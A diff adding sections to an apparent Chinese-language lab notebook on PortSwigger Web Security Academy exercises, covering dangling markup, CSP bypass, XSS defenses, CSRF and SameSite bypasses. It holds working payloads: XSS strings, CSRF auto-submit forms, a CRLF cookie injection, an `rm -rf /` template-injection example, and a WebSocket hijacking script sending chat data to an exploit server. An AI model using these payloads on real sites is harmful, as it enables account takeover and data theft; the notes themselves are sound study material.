@@ -7,13 +7,13 @@ tag:
   - 渗透测试
 author: xmy
 
-
-
 ---
 
 
 
 PortSwigger 网站和 BurpSuite 实验记录，网站地址：https://portswigger.net/  
+
+
 
 
 
@@ -1027,6 +1027,12 @@ XSS 主要有3种类型：
 
 
 
+Cheat sheet：https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+
+
+
+
+
 ### 反射型 XSS
 
 最直接的类型形式。当应用接收到 HTTP 请求，没有经过安全处理，直接将数据包含到 response 中时，就会导致漏洞。
@@ -1384,6 +1390,14 @@ $.parseHTML()
 
   * SVG 等标签，这些标签使用相对较少，有时 WAF 等设备规则库中没有包含，导致不会全部检测
 
+  * 大小写混合，例如：
+
+    ```html
+    <img src=1 oNeRrOr=alert`1`>
+    ```
+
+    
+
 * HTML tag attributes
 
   * 常见的是利用漏洞中断属性标签，插入 payload，例如：`"><script>alert(document.domain)</script>`
@@ -1445,11 +1459,2464 @@ $.parseHTML()
 
 ### Dangling markup injection
 
+悬浮标记注入是一般常规 XSS 被拦截或禁止后的一种手法，常用于跨域窃取信息。  
 
+假设应用有如下内容，且没有禁止 `>` 和 `"` 符号：
+
+```html
+<input type="text" name="input" value="CONTROLLABLE DATA HERE
+```
+
+注入如下内容：
+
+```html
+"><img src='//attacker-website.com?
+```
+
+当浏览器渲染页面后，会生成：
+
+```html
+<input type="text" name="input" value=""><img src='//attacker-website.com?
+```
+
+前面的 input 输入框被闭合，插入新的 img 标签未闭合，浏览器会将页面中下一个 `'` 单引号之前的数据都作为请求发送到这里指定的域名，能窃取到的内容取决于页面，可能包含 token、个人信息等。  
+
+
+
+portswigger 示例：
+
+有一个博客网站，配置了严格的 CSP，但存在 hangling markup 注入，诱导受害者用户点击链接，获取其 csrf token 并修改邮箱：
+
+```html
+<body>
+<script>
+// Define the URLs for the lab environment and the exploit server.
+const academyFrontend = "https://0aa900e304a0eafd80790db70086007a.web-security-academy.net/";
+const exploitServer = "https://exploit-0aa800700427eab780c30cc3012d00bf.exploit-server.net/exploit";
+
+// Extract the CSRF token from the URL.
+const url = new URL(location);
+const csrf = url.searchParams.get('csrf');
+
+// Check if a CSRF token was found in the URL.
+if (csrf) {
+    // If a CSRF token is present, create dynamic form elements to perform the attack.
+    const form = document.createElement('form');
+    const email = document.createElement('input');
+    const token = document.createElement('input');
+
+    // Set the name and value of the CSRF token input to utilize the extracted token for bypassing security measures.
+    token.name = 'csrf';
+    token.value = csrf;
+
+    // Configure the new email address intended to replace the user's current email.
+    email.name = 'email';
+    email.value = 'hacker@evil-user.net';
+
+    // Set the form attributes, append the form to the document, and configure it to automatically submit.
+    form.method = 'post';
+    form.action = `${academyFrontend}my-account/change-email`;
+    form.append(email);
+    form.append(token);
+    document.documentElement.append(form);
+    form.submit();
+
+    // If no CSRF token is present, redirect the browser to a crafted URL that embeds a clickable button designed to expose or generate a CSRF token by making the user trigger a GET request
+} else {
+    location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
+}
+</script>
+</body>
+```
+
+![image-20260821120854745](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260821120854745.png)
+
+exploit 服务器可以看到通过 hangling markup 携带信息的请求：
+
+![image-20260821120936708](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260821120936708.png)
 
 
 
 ### Content Security Policy (CSP)
+
+CSP 这种浏览器安全机制是为了减少 XSS 、dangling markup 、点击劫持之类的攻击。  
+
+服务器返回给浏览器的 response header 中要包括：Content-Security-Policy 这一项。  
+
+* `script-src 'self'`：只允许加载同源站点的脚本
+* `script-src https://scripts.normal-website.com`：允许加载指定网站的脚本
+* `img-src 'self'`：只允许加载同源站点的图像资源
+* `img-src https://images.normal-website.com`：允许加载指定网站的图像资源
+* `frame-ancestors 'self'`：只允许同源页面嵌入
+* `frame-ancestors 'none'`：完全禁止嵌入
+* `frame-ancestors 'self' https://normal-website.com https://*.robust-website.com`：允许嵌入页面的域
+
+
+
+Chrome 新出的 `script-src-elem` 可以覆盖旧的 `script-src`，这在一些把输入反射到 report-uri 指令里的网站，可以被利用以注入分号来添加 CSP 指令。  
+
+示例实验：
+
+请求简化如下：
+
+```html
+GET /?search=friends HTTP/2
+```
+
+响应简化如下：
+
+```html
+HTTP/2 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=
+X-Frame-Options: SAMEORIGIN
+Content-Length: 4394
+
+```
+
+修改请求在 uri 中传入 token ：
+
+```html
+GET /?search=friends&token=123
+```
+
+响应头变为了：
+
+```
+HTTP/2 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=123
+```
+
+再次修改，将搜索内容替换为 js 并将 token 值替换为 `; script-src-elem 'unsafe-inline'`：
+
+```html
+GET /?search=%27%3Cscript%3Ealert(1)%3C/script%3E%27&token=123;script-src-elem%20%27unsafe-inline%27 HTTP/2
+```
+
+响应就变为如下内容：
+
+```html
+HTTP/2 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=123;script-src-elem 'unsafe-inline'
+
+
+... omit ...
+
+                   <section class=blog-header>
+                        <h1>0 search results for ''<script>alert(1)</script>''</h1>
+                        <hr>
+                    </section>
+
+... omit ...
+```
+
+由于浏览器识别到了新指令 **`script-src-elem 'unsafe-inline'`**。因为这个新指令**覆盖（Override）** 了旧的 `script-src`，所以现在页面上可以执行内联脚本（`<script>alert(1)</script>`）了。
+
+
+
+### 预防 XSS 攻击
+
+
+
+#### 输出编码
+
+编码将要输出到客户端的数据内容。  
+
+在 HTML 上下文中，要转换非白名单的值为 HTML entities，例如：  
+
+* `<` 转换为 `&lt;`
+* `>` 转换为 `&gt;`
+
+在 JavaScript 字符串上下文中，要转换非字母及数字的值为 Unicode，例如：  
+
+* `<` 转换为 `\u003c`
+* `>` 转换为 `\u003e`
+
+有些时候需要转换两次，且顺序不能错，下面示例中，要先将 onclick 对应字符串转为 js 安全的 Unicode，再转换成 HTML 编码：
+
+```html
+<a href="#" onclick="x='This string needs two layers of escaping'">test</a>
+```
+
+假设如下内容只做了 HTML 编码：
+
+```php
+onclick="func('<?php echo $user_input; ?>')"
+```
+
+通过 Payload `\u0027\u0029\u003b alert(1)\u002f\u002f` （包含了 Unicode 编码的单引号、括号、分号）还是可以实现逃逸，这些编码不会被 htmlspecialchars，JS 解析器会还原成 `'; alert(1)//`。
+
+
+
+
+
+
+
+#### 验证输入
+
+提交的数据要严格检查
+
+* 如果用户提交了一个 URL 就检查是否以 `http://` 或 `https://`  开头，防止`javascript:` 之类的协议
+* 如果提交了数字检查是否是纯数字
+* 检查字符串是否只包含字母和数字
+* 发现异常直接拒绝，避免尝试清除掉异常字符之类操作，容易出现逻辑漏洞
+* 使用白名单而不是黑名单，避免黑客通过一些手段绕过黑名单。
+
+
+
+
+
+#### 允许"安全的" HTML
+
+* 尽量避免让用户提交 HTML 
+* 但在一些业务场景下有此类需求，传统做法是使用白名单，只允许部分标签，但由于各个浏览器解析方式的差异、Mutation XSS 之类的漏洞，人工写正则之类的过滤无法做到绝对安全
+* Mutation XSS 是指一些场景下浏览器添加或者修改了一些内容，例如输入：`<table><td>...</td></table>`，但浏览器可能帮你补全 `<tbody>`，特殊场景下会被拼接出恶意字符串。
+
+* 使用 DomPurify 之类的框架，但这类框架有时也会出现漏洞，要时常关注修复
+
+
+
+#### 使用模板引擎
+
+* 现在大多数网站使用模板引擎，例如 Twig、Freemarker，这些模板引擎有各自实现的 Escaping System(消毒系统)，将输入的数据做转义。
+* Jinjia、React 之类的框架，默认会开启消毒模式，这样能避免大多数 XSS 。
+* 选择框架时一定要研究清楚它们的 escaping feature （消毒机制），有的默认不开启，有的只转义 HTML 不转义 JS。
+* 一定要避免在模板中拼接传入字符串，容易引发 SSTI
+  * 例如 `render("Hello {{ name }}")` ，传入的是 `name = "<script>"`，模板引擎把 `<` 转成 `<`，输出安全的文本 `Hello &lt;script&gt;`
+  * 如果使用的是拼接方式 `render("Hello " + user_input)` 传入 `"<script>"`，直接拼接出 `Hello <script>`，浏览器解析 HTML 并执行脚本（XSS）。
+  * 如果输入变为 **`{{ 7*7 }}`** 这种，模板引擎会当成普通字符串转义后输出 `Hello {{ 7*7 }}`，而字符串拼接方式则会导致服务器计算后再输出 `Hello 49`，如果被替换为 `{{ system('rm -rf /') }}` 则导致服务器瘫痪。
+
+
+
+
+
+#### In PHP
+
+PHP 有一个内建的方法 `htmlentities` ，有 3 个参数：
+
+* 输入字符串
+* ENT_QUOTES 标志
+* 字符集，常用的是 UTF-8
+* 示例 `<?php echo htmlentities($input, ENT_QUOTES, 'UTF-8');?>`
+
+
+
+但当在处理 JavaScript 字符串上下文时，需要转为 Unicode-escape，但不幸的是 PHP 没有提供这种 API，这里提供一种方式进行转换：
+
+```php
+<?php
+function jsEscape($str) {
+    $output = '';
+    $str = str_split($str);
+    for($i=0;$i<count($str);$i++) {
+        $chrNum = ord($str[$i]);
+        $chr = $str[$i];
+        if($chrNum === 226) {
+            if(isset($str[$i+1]) && ord($str[$i+1]) === 128) {
+                if(isset($str[$i+2]) && ord($str[$i+2]) === 168) {
+                    $output .= '\u2028';
+                    $i += 2;
+                    continue;
+                }
+                if(isset($str[$i+2]) && ord($str[$i+2]) === 169) {
+                    $output .= '\u2029';
+                    $i += 2;
+                    continue;
+                }
+            }
+        }
+        switch($chr) {
+            case "'":
+            case '"':
+            case "\n";
+            case "\r";
+            case "&";
+            case "\\";
+            case "<":
+            case ">":
+                $output .= sprintf("\\u%04x", $chrNum);
+            break;
+            default:
+                $output .= $str[$i];
+            break;
+    }
+    }
+    return $output;
+}
+?>
+```
+
+调用示例：
+
+```php
+<script>x = '<?php echo jsEscape($_GET['x'])?>';</script>
+```
+
+
+
+
+
+#### In JavaScript
+
+在 JS 中要输出 HTML 字符串，编码为 HTML 格式：
+
+```apl
+function htmlEncode(str){
+    return String(str).replace(/[^\w. ]/gi, function(c){
+        return '&#'+c.charCodeAt(0)+';';
+    });
+}
+```
+
+使用示例：
+
+```javascript
+<script>document.body.innerHTML = htmlEncode(untrustedValue)</script>
+```
+
+如果要输出 JavaScript 字符串，编码为 Unicode-escape：
+
+```javascript
+function jsEscape(str){
+    return String(str).replace(/[^\w. ]/gi, function(c){
+        return '\\u'+('0000'+c.charCodeAt(0).toString(16)).slice(-4);
+    });
+}
+```
+
+使用示例：
+
+```javascript
+<script>document.write('<script>x="'+jsEscape(untrustedValue)+'";<\/script>')</script>
+```
+
+
+
+
+
+
+
+
+
+#### In jQuery
+
+`$()` 方法在旧版本中检测到字符串以 `#` 开头就会当成 HTML 渲染，存在被利用的漏洞，新版本已做了修复。也可以参考上面 JavaScript 的 jsEscape 方法进行转义避免漏洞。
+
+
+
+
+
+#### Using CSP
+
+* CSP 是最后一道防御，假设前面的防御都失效或者被攻破，如果 CSP 设置的比较严格，会限制攻击者能做的行为。  
+
+  * 在响应头中包含 `Content-Security-Policy` 字段就可以配置 CSP 策略。  
+
+  * 示例策略：`default-src 'self'; script-src 'self'; object-src 'none'; frame-src 'none'; base-uri 'none';`
+
+  * 上面策略限制了只能从本域名加载脚本、图片等资源。  
+
+* 但是如果允许了 CDN 等外部域名，这个域名下所有的 JS、资源文件，都可以被利用来绕过 CSP。 
+
+* 还可以使用 Nonce （一次性随机数）机制，服务器每次随机生成一个超长字符串，将字符串同时放进 CSP 头和 `<script>` 标签中，浏览器对比一致后才运行脚本。这样黑客无法预知该字符串，即使注入脚本也无法执行。但对于反射型 DOM ，CSP 也无法防护，例如：黑客利用 `eval(location.hash)` 执行代码，，`eval` 本身是页面自己的 JS 代码（有 Nonce 许可），所以 CSP 管不了它。
+
+
+
+如果一个网站开启了 CSP ，渗透测试时还可以做如下尝试：
+
+1. **检查 `script-src` 是否包含 `unsafe-inline`**：如果包含，直接打传统 XSS（因为内联脚本被允许）。
+2. **检查是否包含 `unsafe-eval`**：如果包含，用 `eval` 或 `setTimeout` 字符串执行绕过。
+3. **检查白名单域名**：如果白名单里有 `ajax.googleapis.com`，尝试加载 `ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.js`（旧版 Angular 有 CSP 绕过漏洞）。
+4. **寻找 JSONP 端点**：如果白名单里有 `example.com`，且该域名下有 JSONP 接口（`?callback=func`），你可以构造 `func('alert(1)')` 利用它执行代码（这是经典的 CSP 绕过技巧）。
+5. **检测 Nonce 泄露**：如果在页面源码里发现了 `<script nonce="abc">`，且这个 Nonce 被输出到了 HTML 注释或错误信息中，你可以窃取它并构造自己的 `<script nonce="abc">alert(1)</script>`。
+
+
+
+
+
+
+
+## CSRF(Cross-site request forgery) 跨站请求伪造
+
+
+
+### 影响及条件
+
+CSRF 是一种 Web 安全漏洞，攻击者诱导用户执行他们无意执行的操作，允许攻击者绕过或部分绕过同源策略 SOP ，该策略是为了防止不同网站之间相互干扰。  
+
+
+
+要发起 CSRF 攻击，存在几个关键条件：
+
+* 存在关联动作：攻击者可以诱导用户触发的动作，例如调整权限，修改数据等。
+* 基于 cookie 的会话处理：执行该操作需要发起一个或多个 HTTP 请求，并且应用仅依靠会话 Cookie 来识别发起者，系统中没有其他机制用于跟踪会话或者验证用户请求。
+* 没有不可预测(unpredictable)的参数：执行的操作中，不包含攻击者无法猜测或确定的参数。例如修改密码需要知道当前密码，如果需要就不存在 CSRF 漏洞。
+
+
+
+portswigger 示例，假设某应用存在如下请求用于修改用户邮箱：
+
+```http
+POST /email/change HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 30
+Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE
+
+email=wiener@normal-user.com
+```
+
+此请求符合上面描述的条件：
+
+* 存在相关操作，修改邮箱成功后通常可以触发密码重置之类功能，从而控制账户。
+* 依赖 Cookie：通过 Cookie 来识别会话，没有其它机制
+* 参数可预测：仅存在 cookie、email 地址
+
+通过上面条件，攻击者可以构造如下 HTML 页面：
+
+```html
+<html>
+    <body>
+        <form action="https://vulnerable-website.com/email/change" method="POST">
+            <input type="hidden" name="email" value="pwned@evil-user.net" />
+        </form>
+        <script>
+            document.forms[0].submit();  // 页面加载后自动提交表单
+        </script>
+    </body>
+</html>
+```
+
+当受害者被诱骗访问这个页面后，会执行如下动作：
+
+* 向网站发起 HTTP 请求
+* 如果受害者已经登录网站，浏览器会自动携带相关 cookie （这里假设未启用 Samesite Cookie 机制）
+* 网站将这个请求视作受害者本人操作，按照正常流程处理修改邮箱操作
+
+
+
+
+
+### 构造和传递 CSRF exploit
+
+典型的方法是通过 email、社交软件传递 http链接，诱骗用户访问恶意构造的钓鱼网站，或者在一些流行的网站评论区、帖子上发表链接等待用户访问。有一些简单的 CSRF expolit 利用 GET 请求可以完全包含在一个单一的 URL 请求中，例如假设一个网站可以通过 GET 请求修改邮箱，一个自包含的攻击可能如下：
+
+```html
+<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
+```
+
+  
+
+XSS 和 CSRF 的区别：
+
+* XSS 通常允许攻击者在用户浏览器中执行任意 JS 代码
+* CSRF 通常是攻击者诱导用户做出并非他们本意的动作
+* 通常 XSS 的严重性高于 CSRF
+* CSRF token 是否能够预防 XSS 攻击取决于场景
+  * 如果网站存在 反射型 XSS 漏洞的功能，设置了 CSRF token 校验，该漏洞会被防护，但其它存在 反射型 XSS 漏洞的功能如果未设置校验 CSRF token 则不会被防护
+  * CSRF token 不能防护存储型 XSS 攻击
+  * 正确处理 XSS 还是要从 检查输入、输出编码、CSP 等机制入手
+
+
+
+### 防御 CSRF 的机制
+
+* CSRF Token ：服务器生成，与客户端共享且唯一的值，客户端提交敏感操作时携带 token，服务器检查是否有正确凭证
+* SameSite cookies：请求来自其它网站时，浏览器决定是否携带某网站的 cookie
+* Referer-based validation：服务器检查请求来源，即 Header 中的 Referer 字段
+
+
+
+
+
+
+
+### CSRF Token
+
+一个 CSRF token 通常是由服务端应用生成的：唯一、机密、不可预测的一个值，共享给客户端。当客户端触发一个敏感动作，例如提交表单时，应该携带正确的 token，否则服务端拒绝该请求。  
+
+一个常见的方式是在返回的 HTML 的 form 表单中存放 csrf 值并设置为隐藏属性，例如：
+
+```html
+<form name="change-email-form" action="/my-account/change-email" method="POST">
+    <label>Email</label>
+    <input required type="email" name="email" value="example@normal-website.com">
+    <input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
+    <button class='button' type='submit'> Update email </button>
+</form>
+
+```
+
+提交这个表单时的请求大致如下：
+
+```http
+POST /my-account/change-email HTTP/1.1
+Host: normal-website.com
+Content-Length: 70
+Content-Type: application/x-www-form-urlencoded
+
+csrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&email=example@normal-website.com
+```
+
+当正确实现时，CSRF token 可以帮助防护 CSRF 攻击，攻击者无法预测，就无法在发起的恶意请求中包含该 token。
+
+
+
+**常见缺陷**  
+
+* 未在所有请求方法上都做校验，例如常规是 POST 请求做了 token 校验，但更换为 GET 请求则直接通过
+
+* 有些应用程序在 token 缺失时跳过校验，通常是程序实现中仅校验 token 是否存在而不是是否有效
+
+* token 没有和用户 session 关联，会话池中任意 token 都可以通过校验
+
+* 双重提交 Cookie 防御机制：服务端不存储 Token 而是直接返回给客户端 Cookie 中，但是如果网站存在任何可以修改客户端 Cookie 的功能，就能被轻易绕过
+
+  * portswigger 实验示例：
+
+    ```html
+    <!-- 通过 search 功能注入 cookie 中 csrf ，然后再将 csrf 和 邮箱 POST 提交 -->
+    <html>
+        <body>
+            <form action="https://0a5f001503af559980c0038200840008.web-security-academy.net/my-account/change-email" method="POST">
+                <input type="hidden" name="email" value="pwned@evil-user.net" />
+    			<input required type=hidden name=csrf value=XXXXXX>
+            </form>
+            <img src="https://0a5f001503af559980c0038200840008.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=XXXXXX%3b%20SameSite=None" onerror="document.forms[0].submit()">
+        </body>
+    </html>
+    ```
+
+    
+
+
+
+
+
+### SameSite cookies
+
+SameSite 是一种浏览器安全机制，用于确定来自其它网站的请求中，何时包含一个 cookie。SameSite Cookie 主要为跨站访问提供部分保护，用于 CSRF、Cross-site leak、CROS 等。  
+
+
+
+#### Context 
+
+在 SameSite context 中，Site 被定义为： TLD 顶级域（例如 `.com`、`.net` 等）加上一个额外层级，通常也被称为 TLD+1（例如 `example.com`）。URL协议（Scheme）的不同通常也被视为不同站点。还有一类称为 eTLD （顶级有效域）的域名，例如 `.com.cn`、`.co.uk` 这种在实践中通常也被视为同站点，eTLD 域名的计算机制参考**公共后缀列表（Public Suffix List，PSL）**。  
+
+![image-20260825162322762](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260825162322762.png)
+
+
+
+#### Site VS Origin
+
+这两个术语的主要区别在于范围(Scope)，它们密切相关但不能互换，混为一谈可能会有安全隐患。  
+
+如果两个 URL 使用完全相同的协议(Scheme)、域名和端口，则被视为相同的 Origin。而 Site 只考虑协议和域名最后一部分(eTLD)，一个跨源请求（Cross-origin）可以是同站（SameSite）的，反过来则不行。  
+
+
+
+![image-20260825163125117](../upload/2026-07-06-PortSwigger_BurpSuite/image-20260825163125117.png)
+
+
+
+
+
+| **Request from**          | **Request to**                 | **Same-site?**        | **Same-origin?**           |
+| ------------------------- | ------------------------------ | --------------------- | -------------------------- |
+| `https://example.com`     | `https://example.com`          | Yes                   | Yes                        |
+| `https://app.example.com` | `https://intranet.example.com` | Yes                   | No: mismatched domain name |
+| `https://example.com`     | `https://example.com:8080`     | Yes                   | No: mismatched port        |
+| `https://example.com`     | `https://example.co.uk`        | No: mismatched eTLD   | No: mismatched domain name |
+| `https://example.com`     | `http://example.com`           | No: mismatched scheme | No: mismatched scheme      |
+
+
+
+
+
+#### 工作机制
+
+在 SameSite 安全机制出现之前，浏览器会在每个 request 中携带该域名的 Cookie，即使请求是由完全不相关的第三方网站发起。SameSite 的出现是为了让网站开发者和浏览器控制哪些跨站请求（ Cross-Site）可以携带特定的 Cookie。这样可以降低收到 CSRF 攻击的风险，因为 CSRF 类的攻击通常是诱导用户触发一些有害的操作，需要携带受害者的会话 Cookie，如果浏览器限制了携带 Cookie，攻击就会失效。   
+
+从 2021 年起，如果网站没有显式地声明，Chrome 默认采用 Lax 级别的 SameSite 限制。主流浏览器支持这3种 SameSite 级别：
+
+* Strict ：在任何跨站请求中都不会携带 Cookie，这是最安全的选项，但会影响用户体验，例如导航中跳转到一个目标网站也算跨站，Strict 级别下这种跳转不会携带 Cookie，需要重新登录。
+* Lax：有条件的鞋带 Cookie，必须同时满足两个条件：GET 请求 + 用户主动触发的顶层导航操作。这样在 POST 请求、后台请求（`<script>`中发起的 `fetch`、`<iframe>`、`<img>` 之类）这些 CSRF 常见的利用方式中都不携带。
+* None：和 SameSite 机制出现之前一样。
+  * 设置 `SameSite=None` 时必须同时加上 `Secure` 属性，强制要求这个 Cookie 只能在 https 中传输。
+  * 除了 Chrome 之外，其它浏览器在未显式设置该属性时，默认是 None 级别。  
+
+
+
+#### 绕过 SameSite
+
+在一些场景下即使配置了 SameSite 也存在漏洞可以绕过：
+
+* Lax 模式下利用 GET 方法。
+
+  * 如果服务端接口可以处理 GET 请求，就可以通过如下请求绕过
+
+    ```html
+    <script>
+        document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
+    </script>
+    ```
+
+    
+
+  * 还有一种 `_method`  参数覆盖请求的方法，有些框架支持“方法覆盖”，读取 `_method` 这个隐藏的参数，虽然浏览器提交使用 GET 方法并携带了 Cookie，但是框架按照 POST 方法处理：
+
+    ```html
+    <form action="https://vulnerable-website.com/account/transfer-payment" method="GET">
+        <input type="hidden" name="_method" value="POST">
+        <input type="hidden" name="recipient" value="hacker">
+        <input type="hidden" name="amount" value="1000000">
+    </form>
+    ```
+
+    
+
+* 找到可以利用的客户端跳转。
+
+  * 有些功能没有使用服务端 301、302 之类的跳转，而是使用了 JS 改变 `location`，攻击者如果找到可以修改替换该 URL，例如 `document.location = '/account/change-email?email=hacker@evil.net'` ，这种请求浏览器认为是内部而不是跨站的，因而会携带所有 Cookie。
+
+  * portswigger 示例，网页存在提交评论后自动返回blog 的 gadget，存在可以修改 URL 跳转的漏洞：
+
+    ```
+    <script>
+        document.location = "https://0a510067046336c381440c6300ad00ad.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
+    </script>
+    ```
+
+    
+
+* 兄弟域名利用。
+
+* Chrome 2分钟宽限。Chrome 的 Lax-by-default 有一个特殊规定，新创建的 Cookie 在 2 分钟内会即使是跨站 POST 请求也会被携带。
+
+  
+
+portswigger 兄弟域名实验：有一个带聊天室的 blog ，聊天室使用 websocket 传输消息，存在可以被利用的 CSWSH （跨站websocket劫持）漏洞。  
+
+* 访问页面点击主页、聊天、登录等内容，查看 BurpSuite 中历史、Target 等信息，尝试发送消息观察交互
+
+* websocket 握手请求中不包含任何 csrf token，客户端准备好之后发送 READY 消息给服务器
+
+  ```http
+  GET /chat HTTP/1.1
+  Host: 0a4d00ae0354a8268240fc9a00610034.web-security-academy.net
+  Connection: Upgrade
+  Pragma: no-cache
+  Cache-Control: no-cache
+  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
+  Upgrade: websocket
+  Origin: https://0a4d00ae0354a8268240fc9a00610034.web-security-academy.net
+  Sec-WebSocket-Version: 13
+  Accept-Encoding: gzip, deflate, br
+  Accept-Language: zh-CN,zh;q=0.9
+  Cookie: session=5SEhWgLUoCuu1CXjZO4FiPI8wolwU71H
+  Sec-WebSocket-Key: 9lwaQicxFnoRHWpH1A0kiQ==
+  
+  ```
+
+* 使用如下脚本，尝试建立链接发送消息到  exploit 服务器（由于 collaborator 需要会员使用此方式代替）
+
+  ```javascript
+  <script>
+      var ws = new WebSocket('wss://0a4d00ae0354a8268240fc9a00610034.web-security-academy.net/chat');
+      ws.onopen = function() {
+          ws.send("READY");
+      };
+      ws.onmessage = function(event) {
+          // 将聊天记录通过 GET 请求发送到 Exploit Server 的日志中
+          var data = encodeURIComponent(event.data);
+          new Image().src = 'https://exploit-0a8c00bb042cb600802d11b2014d0036.exploit-server.net/exploit?log=' + data;
+      };
+  </script>
+  ```
+
+  * 由于限制了 SameSite=Strict ，发起的请求不会携带 cookie 信息，因此无法获取到消息
+
+* 在网站上继续寻找，可以找到一些响应头中包含 `Access-Control-Allow-Origin: https://cms-0a4d00ae0354a8268240fc9a00610034.web-security-academy.net` ，访问这个域名发现有用户名密码认证，且用户名存在 js 注入漏洞，这是这个 LAB 设计好可以用来利用的 Sink
+
+  * 使用如下链接测试，可以成功调用 alert
+
+    ```html
+    https://cms-0a4d00ae0354a8268240fc9a00610034.web-security-academy.net/login?username=%3Cscript%3Ealert()%3C/script%3E&password=xxxxxx
+    ```
+
+* 再将之前的 JS 编码为 URL 形式，替换掉上面 cms 链接中 username 参数部分
+
+  ```html
+  https://cms-0a4d00ae0354a8268240fc9a00610034.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%34%64%30%30%61%65%30%33%35%34%61%38%32%36%38%32%34%30%66%63%39%61%30%30%36%31%30%30%33%34%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%2f%2f%20%e5%b0%86%e8%81%8a%e5%a4%a9%e8%ae%b0%e5%bd%95%e9%80%9a%e8%bf%87%20%47%45%54%20%e8%af%b7%e6%b1%82%e5%8f%91%e9%80%81%e5%88%b0%20%45%78%70%6c%6f%69%74%20%53%65%72%76%65%72%20%e7%9a%84%e6%97%a5%e5%bf%97%e4%b8%ad%0a%20%20%20%20%20%20%20%20%76%61%72%20%64%61%74%61%20%3d%20%65%6e%63%6f%64%65%55%52%49%43%6f%6d%70%6f%6e%65%6e%74%28%65%76%65%6e%74%2e%64%61%74%61%29%3b%0a%20%20%20%20%20%20%20%20%6e%65%77%20%49%6d%61%67%65%28%29%2e%73%72%63%20%3d%20%27%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%38%63%30%30%62%62%30%34%32%63%62%36%30%30%38%30%32%64%31%31%62%32%30%31%34%64%30%30%33%36%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%6c%6f%67%3d%27%20%2b%20%64%61%74%61%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&password=xxxxxx
+  ```
+
+* 将上面内容放到一个 location.href 通过 exploit 服务器发送给受害者：
+
+  ```javascript
+  <script>
+      document.location = 'https://cms-0a4d00ae0354a8268240fc9a00610034.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%34%64%30%30%61%65%30%33%35%34%61%38%32%36%38%32%34%30%66%63%39%61%30%30%36%31%30%30%33%34%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%2f%2f%20%e5%b0%86%e8%81%8a%e5%a4%a9%e8%ae%b0%e5%bd%95%e9%80%9a%e8%bf%87%20%47%45%54%20%e8%af%b7%e6%b1%82%e5%8f%91%e9%80%81%e5%88%b0%20%45%78%70%6c%6f%69%74%20%53%65%72%76%65%72%20%e7%9a%84%e6%97%a5%e5%bf%97%e4%b8%ad%0a%20%20%20%20%20%20%20%20%76%61%72%20%64%61%74%61%20%3d%20%65%6e%63%6f%64%65%55%52%49%43%6f%6d%70%6f%6e%65%6e%74%28%65%76%65%6e%74%2e%64%61%74%61%29%3b%0a%20%20%20%20%20%20%20%20%6e%65%77%20%49%6d%61%67%65%28%29%2e%73%72%63%20%3d%20%27%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%38%63%30%30%62%62%30%34%32%63%62%36%30%30%38%30%32%64%31%31%62%32%30%31%34%64%30%30%33%36%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f